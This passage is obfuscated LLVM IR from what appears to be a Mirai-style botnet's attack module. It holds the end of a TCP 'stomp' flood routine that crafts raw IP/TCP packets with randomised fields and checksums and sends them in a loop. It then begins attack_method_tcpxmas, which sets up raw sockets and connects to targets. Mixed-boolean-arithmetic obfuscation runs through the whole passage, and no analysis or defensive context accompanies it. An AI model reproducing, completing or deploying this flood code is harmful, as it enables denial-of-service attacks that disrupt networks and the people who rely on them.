  %564 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %565 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %564, i32 0, i32 4
  %566 = load i16, i16* %565, align 4
  %567 = xor i16 1, -1
  %568 = xor i16 %563, %567
  %569 = and i16 %568, %563
  %570 = and i16 %563, 1
  %571 = shl i16 %569, 12
  %572 = xor i16 -4097, -1
  %573 = xor i16 %566, %572
  %574 = and i16 %573, %566
  %575 = and i16 %566, -4097
  %576 = and i16 %574, %571
  %577 = xor i16 %574, %571
  %578 = or i16 %576, %577
  %579 = or i16 %574, %571
  store i16 %578, i16* %565, align 4
  %580 = load i8, i8* %20, align 1
  %581 = sext i8 %580 to i16
  %582 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %583 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %582, i32 0, i32 4
  %584 = load i16, i16* %583, align 4
  %585 = xor i16 1, -1
  %586 = xor i16 %581, %585
  %587 = and i16 %586, %581
  %588 = and i16 %581, 1
  %589 = shl i16 %587, 11
  %590 = xor i16 -2049, -1
  %591 = xor i16 %584, %590
  %592 = and i16 %591, %584
  %593 = and i16 %584, -2049
  %594 = xor i16 %592, -1
  %595 = xor i16 %589, -1
  %596 = xor i16 -32243, -1
  %597 = and i16 %594, -32243
  %598 = and i16 %592, %596
  %599 = and i16 %595, -32243
  %600 = and i16 %589, %596
  %601 = or i16 %597, %598
  %602 = or i16 %599, %600
  %603 = xor i16 %601, %602
  %604 = or i16 %594, %595
  %605 = xor i16 %604, -1
  %606 = or i16 -32243, %596
  %607 = and i16 %605, %606
  %608 = or i16 %603, %607
  %609 = or i16 %592, %589
  store i16 %608, i16* %583, align 4
  %610 = load i8, i8* %21, align 1
  %611 = sext i8 %610 to i16
  %612 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 4
  %614 = load i16, i16* %613, align 4
  %615 = xor i16 %611, -1
  %616 = xor i16 1, -1
  %617 = xor i16 -16962, -1
  %618 = or i16 %615, %616
  %619 = or i16 -16962, %617
  %620 = xor i16 %618, -1
  %621 = and i16 %620, %619
  %622 = and i16 %611, 1
  %623 = shl i16 %621, 10
  %624 = xor i16 -1025, -1
  %625 = xor i16 %614, %624
  %626 = and i16 %625, %614
  %627 = and i16 %614, -1025
  %628 = xor i16 %626, -1
  %629 = xor i16 %623, -1
  %630 = xor i16 5433, -1
  %631 = and i16 %628, 5433
  %632 = and i16 %626, %630
  %633 = and i16 %629, 5433
  %634 = and i16 %623, %630
  %635 = or i16 %631, %632
  %636 = or i16 %633, %634
  %637 = xor i16 %635, %636
  %638 = or i16 %628, %629
  %639 = xor i16 %638, -1
  %640 = or i16 5433, %630
  %641 = and i16 %639, %640
  %642 = or i16 %637, %641
  %643 = or i16 %626, %623
  store i16 %642, i16* %613, align 4
  %644 = load i8, i8* %22, align 1
  %645 = sext i8 %644 to i16
  %646 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %647 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %646, i32 0, i32 4
  %648 = load i16, i16* %647, align 4
  %649 = xor i16 %645, -1
  %650 = xor i16 1, -1
  %651 = xor i16 27583, -1
  %652 = or i16 %649, %650
  %653 = or i16 27583, %651
  %654 = xor i16 %652, -1
  %655 = and i16 %654, %653
  %656 = and i16 %645, 1
  %657 = shl i16 %655, 9
  %658 = xor i16 %648, -1
  %659 = xor i16 -513, -1
  %660 = xor i16 21637, -1
  %661 = or i16 %658, %659
  %662 = or i16 21637, %660
  %663 = xor i16 %661, -1
  %664 = and i16 %663, %662
  %665 = and i16 %648, -513
  %666 = xor i16 %664, -1
  %667 = xor i16 %657, -1
  %668 = xor i16 15707, -1
  %669 = and i16 %666, 15707
  %670 = and i16 %664, %668
  %671 = and i16 %667, 15707
  %672 = and i16 %657, %668
  %673 = or i16 %669, %670
  %674 = or i16 %671, %672
  %675 = xor i16 %673, %674
  %676 = or i16 %666, %667
  %677 = xor i16 %676, -1
  %678 = or i16 15707, %668
  %679 = and i16 %677, %678
  %680 = or i16 %675, %679
  %681 = or i16 %664, %657
  store i16 %680, i16* %647, align 4
  %682 = load i8, i8* %23, align 1
  %683 = sext i8 %682 to i16
  %684 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %685 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %684, i32 0, i32 4
  %686 = load i16, i16* %685, align 4
  %687 = xor i16 %683, -1
  %688 = xor i16 1, -1
  %689 = xor i16 -9803, -1
  %690 = or i16 %687, %688
  %691 = or i16 -9803, %689
  %692 = xor i16 %690, -1
  %693 = and i16 %692, %691
  %694 = and i16 %683, 1
  %695 = shl i16 %693, 8
  %696 = xor i16 %686, -1
  %697 = xor i16 -257, -1
  %698 = xor i16 30299, -1
  %699 = or i16 %696, %697
  %700 = or i16 30299, %698
  %701 = xor i16 %699, -1
  %702 = and i16 %701, %700
  %703 = and i16 %686, -257
  %704 = xor i16 %702, -1
  %705 = xor i16 %695, -1
  %706 = xor i16 -22882, -1
  %707 = and i16 %704, -22882
  %708 = and i16 %702, %706
  %709 = and i16 %705, -22882
  %710 = and i16 %695, %706
  %711 = or i16 %707, %708
  %712 = or i16 %709, %710
  %713 = xor i16 %711, %712
  %714 = or i16 %704, %705
  %715 = xor i16 %714, -1
  %716 = or i16 -22882, %706
  %717 = and i16 %715, %716
  %718 = or i16 %713, %717
  %719 = or i16 %702, %695
  store i16 %718, i16* %685, align 4
  %720 = load i8*, i8** %38, align 8
  %721 = load i32, i32* %24, align 4
  call void @rand_str(i8* %720, i32 %721)
  br label %765

; <label>:722:                                    ; preds = %264, %249
  %723 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %724 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %723, i32 0, i32 4
  %725 = load i16, i16* %724, align 4
  %726 = lshr i16 %725, 8
  %727 = xor i16 1, -1
  %728 = xor i16 %726, %727
  %729 = and i16 %728, %726
  %730 = and i16 %726, 1
  %731 = zext i16 %729 to i32
  %732 = icmp ne i32 %731, 0
  br i1 %732, label %748, label %733

; <label>:733:                                    ; preds = %722
  %734 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %735 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %734, i32 0, i32 4
  %736 = load i16, i16* %735, align 4
  %737 = lshr i16 %736, 10
  %738 = xor i16 %737, -1
  %739 = xor i16 1, -1
  %740 = xor i16 -17407, -1
  %741 = or i16 %738, %739
  %742 = or i16 -17407, %740
  %743 = xor i16 %741, -1
  %744 = and i16 %743, %742
  %745 = and i16 %737, 1
  %746 = zext i16 %744 to i32
  %747 = icmp ne i32 %746, 0
  br i1 %747, label %748, label %751

; <label>:748:                                    ; preds = %733, %722
  %749 = load i32, i32* %26, align 4
  %750 = call i32 @close(i32 %749)
  br label %121

; <label>:751:                                    ; preds = %733
  br label %752

; <label>:752:                                    ; preds = %751
  br label %753

; <label>:753:                                    ; preds = %752, %237
  br label %754

; <label>:754:                                    ; preds = %753, %233, %225
  %755 = call i64 @time(i64* null) #6
  %756 = load i64, i64* %31, align 8
  %757 = sub i64 0, %756
  %758 = add i64 %755, %757
  %759 = sub nsw i64 %755, %756
  %760 = icmp sgt i64 %758, 10
  br i1 %760, label %761, label %764

; <label>:761:                                    ; preds = %754
  %762 = load i32, i32* %26, align 4
  %763 = call i32 @close(i32 %762)
  br label %121

; <label>:764:                                    ; preds = %754
  br label %213

; <label>:765:                                    ; preds = %421
  br label %766

; <label>:766:                                    ; preds = %765, %124
  %767 = load i32, i32* %9, align 4
  %768 = sub i32 %767, 379486672
  %769 = add i32 %768, 1
  %770 = add i32 %769, 379486672
  %771 = add nsw i32 %767, 1
  store i32 %770, i32* %9, align 4
  br label %115

; <label>:772:                                    ; preds = %115
  br label %773

; <label>:773:                                    ; preds = %901, %772
  store i32 0, i32* %9, align 4
  br label %774

; <label>:774:                                    ; preds = %896, %773
  %775 = load i32, i32* %9, align 4
  %776 = load i8, i8* %5, align 1
  %777 = zext i8 %776 to i32
  %778 = icmp slt i32 %775, %777
  br i1 %778, label %779, label %901

; <label>:779:                                    ; preds = %774
  %780 = load i8**, i8*** %12, align 8
  %781 = load i32, i32* %9, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds i8*, i8** %780, i64 %782
  %784 = load i8*, i8** %783, align 8
  store i8* %784, i8** %39, align 8
  %785 = load i8*, i8** %39, align 8
  %786 = bitcast i8* %785 to %struct.iphdr*
  store %struct.iphdr* %786, %struct.iphdr** %40, align 8
  %787 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %788 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %787, i64 1
  %789 = bitcast %struct.iphdr* %788 to %struct.tcphdr*
  store %struct.tcphdr* %789, %struct.tcphdr** %41, align 8
  %790 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %791 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %790, i64 1
  %792 = bitcast %struct.tcphdr* %791 to i8*
  store i8* %792, i8** %42, align 8
  %793 = load i16, i16* %14, align 2
  %794 = zext i16 %793 to i32
  %795 = icmp eq i32 %794, 65535
  br i1 %795, label %796, label %805

; <label>:796:                                    ; preds = %779
  %797 = call i32 @rand_next()
  %798 = xor i32 65535, -1
  %799 = xor i32 %797, %798
  %800 = and i32 %799, %797
  %801 = and i32 %797, 65535
  %802 = trunc i32 %800 to i16
  %803 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %804 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %803, i32 0, i32 3
  store i16 %802, i16* %804, align 4
  br label %805

; <label>:805:                                    ; preds = %796, %779
  %806 = load i8, i8* %25, align 1
  %807 = icmp ne i8 %806, 0
  br i1 %807, label %808, label %811

; <label>:808:                                    ; preds = %805
  %809 = load i8*, i8** %42, align 8
  %810 = load i32, i32* %24, align 4
  call void @rand_str(i8* %809, i32 %810)
  br label %811

; <label>:811:                                    ; preds = %808, %805
  %812 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %813 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %812, i32 0, i32 7
  store i16 0, i16* %813, align 2
  %814 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %815 = bitcast %struct.iphdr* %814 to i16*
  %816 = call zeroext i16 @checksum_generic(i16* %815, i32 20)
  %817 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %818 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %817, i32 0, i32 7
  store i16 %816, i16* %818, align 2
  %819 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %820 = load i32, i32* %9, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %819, i64 %821
  %823 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %822, i32 0, i32 1
  %824 = load i32, i32* %823, align 4
  %825 = add i32 %824, -986047296
  %826 = add i32 %825, 1
  %827 = sub i32 %826, -986047296
  %828 = add i32 %824, 1
  store i32 %827, i32* %823, align 4
  %829 = trunc i32 %824 to i16
  %830 = call zeroext i16 @htons(i16 zeroext %829) #7
  %831 = zext i16 %830 to i32
  %832 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %833 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %832, i32 0, i32 2
  store i32 %831, i32* %833, align 4
  %834 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %835 = load i32, i32* %9, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %834, i64 %836
  %838 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %837, i32 0, i32 2
  %839 = load i32, i32* %838, align 4
  %840 = trunc i32 %839 to i16
  %841 = call zeroext i16 @htons(i16 zeroext %840) #7
  %842 = zext i16 %841 to i32
  %843 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %844 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %843, i32 0, i32 3
  store i32 %842, i32* %844, align 4
  %845 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %846 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %845, i32 0, i32 6
  store i16 0, i16* %846, align 4
  %847 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %848 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %849 = bitcast %struct.tcphdr* %848 to i8*
  %850 = load i32, i32* %24, align 4
  %851 = sext i32 %850 to i64
  %852 = sub i64 0, 20
  %853 = sub i64 0, %851
  %854 = add i64 %852, %853
  %855 = sub i64 0, %854
  %856 = add i64 20, %851
  %857 = trunc i64 %855 to i16
  %858 = call zeroext i16 @htons(i16 zeroext %857) #7
  %859 = load i32, i32* %24, align 4
  %860 = sext i32 %859 to i64
  %861 = sub i64 20, -6784682121058954457
  %862 = add i64 %861, %860
  %863 = add i64 %862, -6784682121058954457
  %864 = add i64 20, %860
  %865 = trunc i64 %863 to i32
  %866 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %847, i8* %849, i16 zeroext %858, i32 %865)
  %867 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %868 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %867, i32 0, i32 6
  store i16 %866, i16* %868, align 4
  %869 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %870 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %869, i32 0, i32 1
  %871 = load i16, i16* %870, align 2
  %872 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %873 = load i32, i32* %9, align 4
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %872, i64 %874
  %876 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %875, i32 0, i32 0
  %877 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %876, i32 0, i32 1
  store i16 %871, i16* %877, align 2
  %878 = load i32, i32* %10, align 4
  %879 = load i8*, i8** %39, align 8
  %880 = load i32, i32* %24, align 4
  %881 = sext i32 %880 to i64
  %882 = add i64 40, 2767757839261503863
  %883 = add i64 %882, %881
  %884 = sub i64 %883, 2767757839261503863
  %885 = add i64 40, %881
  %886 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %887 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %888 = load i32, i32* %9, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %887, i64 %889
  %891 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %890, i32 0, i32 0
  %892 = bitcast %struct.sockaddr_in* %891 to %struct.sockaddr*
  store %struct.sockaddr* %892, %struct.sockaddr** %886, align 8
  %893 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %894 = load %struct.sockaddr*, %struct.sockaddr** %893, align 8
  %895 = call i64 @sendto(i32 %878, i8* %879, i64 %884, i32 16384, %struct.sockaddr* %894, i32 16)
  br label %896

; <label>:896:                                    ; preds = %811
  %897 = load i32, i32* %9, align 4
  %898 = sub i32 0, 1
  %899 = sub i32 %897, %898
  %900 = add nsw i32 %897, 1
  store i32 %899, i32* %9, align 4
  br label %774

; <label>:901:                                    ; preds = %774
  br label %773

; <label>:902:                                    ; preds = %224, %111, %105
  ret void
}

declare i32 @fcntl(i32, i32, ...) #4

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %836

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %836

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %701, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %706

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %696, %683, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %701

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = xor i32 %128, -1
  %130 = xor i32 2048, -1
  %131 = xor i32 -2116746207, -1
  %132 = and i32 %129, -2116746207
  %133 = and i32 %128, %131
  %134 = and i32 %130, -2116746207
  %135 = and i32 2048, %131
  %136 = or i32 %132, %133
  %137 = or i32 %134, %135
  %138 = xor i32 %136, %137
  %139 = or i32 %129, %130
  %140 = xor i32 %139, -1
  %141 = or i32 -2116746207, %131
  %142 = and i32 %140, %141
  %143 = or i32 %138, %142
  %144 = or i32 %128, 2048
  %145 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %143)
  %146 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %146, align 4
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 4
  %153 = zext i8 %152 to i32
  %154 = icmp slt i32 %153, 32
  br i1 %154, label %155, label %179

; <label>:155:                                    ; preds = %125
  %156 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i64 %158
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i32 0, i32 1
  %161 = load i32, i32* %160, align 4
  %162 = call i32 @ntohl(i32 %161) #7
  %163 = call i32 @rand_next()
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 2
  %169 = load i8, i8* %168, align 4
  %170 = zext i8 %169 to i32
  %171 = lshr i32 %163, %170
  %172 = sub i32 %162, -1229385018
  %173 = add i32 %172, %171
  %174 = add i32 %173, -1229385018
  %175 = add i32 %162, %171
  %176 = call i32 @htonl(i32 %174) #7
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %178 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %177, i32 0, i32 0
  store i32 %176, i32* %178, align 4
  br label %188

; <label>:179:                                    ; preds = %125
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %187 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %186, i32 0, i32 0
  store i32 %185, i32* %187, align 4
  br label %188

; <label>:188:                                    ; preds = %179, %155
  %189 = load i16, i16* %17, align 2
  %190 = zext i16 %189 to i32
  %191 = icmp eq i32 %190, 65535
  br i1 %191, label %192, label %200

; <label>:192:                                    ; preds = %188
  %193 = call i32 @rand_next()
  %194 = xor i32 65535, -1
  %195 = xor i32 %193, %194
  %196 = and i32 %195, %193
  %197 = and i32 %193, 65535
  %198 = trunc i32 %196 to i16
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %198, i16* %199, align 2
  br label %204

; <label>:200:                                    ; preds = %188
  %201 = load i16, i16* %17, align 2
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %202, i16* %203, align 2
  br label %204

; <label>:204:                                    ; preds = %200, %192
  %205 = load i32, i32* %26, align 4
  %206 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %207 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %207, %struct.sockaddr** %206, align 8
  %208 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %209 = load %struct.sockaddr*, %struct.sockaddr** %208, align 8
  %210 = call i32 @connect(i32 %205, %struct.sockaddr* %209, i32 16)
  %211 = call i64 @time(i64* null) #6
  store i64 %211, i64* %31, align 8
  br label %212

; <label>:212:                                    ; preds = %699, %204
  store i32 16, i32* %29, align 4
  %213 = load i32, i32* %10, align 4
  %214 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %215 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %216 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %216, %struct.sockaddr** %215, align 8
  %217 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %218 = load %struct.sockaddr*, %struct.sockaddr** %217, align 8
  %219 = call i64 @recvfrom(i32 %213, i8* %214, i64 256, i32 16384, %struct.sockaddr* %218, i32* %29)
  %220 = trunc i64 %219 to i32
  store i32 %220, i32* %33, align 4
  %221 = load i32, i32* %33, align 4
  %222 = icmp eq i32 %221, -1
  br i1 %222, label %223, label %224

; <label>:223:                                    ; preds = %212
  br label %836

; <label>:224:                                    ; preds = %212
  %225 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %226 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 4
  %228 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %229 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %228, i32 0, i32 0
  %230 = load i32, i32* %229, align 4
  %231 = icmp eq i32 %227, %230
  br i1 %231, label %232, label %689

; <label>:232:                                    ; preds = %224
  %233 = load i32, i32* %33, align 4
  %234 = sext i32 %233 to i64
  %235 = icmp ugt i64 %234, 40
  br i1 %235, label %236, label %689

; <label>:236:                                    ; preds = %232
  %237 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %238 = getelementptr inbounds i8, i8* %237, i64 20
